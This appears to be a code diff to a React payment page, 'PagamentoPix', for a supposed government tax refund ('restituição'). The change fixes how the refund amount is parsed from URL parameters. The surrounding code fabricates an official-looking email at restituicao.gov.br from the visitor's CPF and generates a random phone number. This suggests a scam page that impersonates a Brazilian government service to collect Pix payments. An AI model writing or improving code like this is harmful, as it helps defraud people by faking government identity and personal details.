@@ -102,7 +102,17 @@ export default function PagamentoPix() {
   // Dados da restituição
   const cpf = urlParams.get('cpf') || "";
   const nome = urlParams.get('nome') || "";
-  const valor = parseFloat(urlParams.get('valor') || "2500");
+  
+  // Corrigir a formatação do valor - converter centavos para reais
+  let valor = 0;
+  const valorParam = urlParams.get('valor') || "0";
+  if (valorParam) {
+    // Se o valor for maior que 10.000, provavelmente está em centavos
+    // e precisa ser convertido para reais
+    const valorNumerico = parseFloat(valorParam);
+    valor = valorNumerico > 10000 ? valorNumerico / 100 : valorNumerico;
+  }
+  
   const email = urlParams.get('email') || `${cpf.substring(0, 3)}xxx${cpf.substring(9, 11)}@restituicao.gov.br`;
   const telefone = urlParams.get('telefone') || `(11) 9${Math.floor(Math.random() * 9000) + 1000}-${Math.floor(Math.random() * 9000) + 1000}`;
   const valorFormatado = formatarValor(valor);
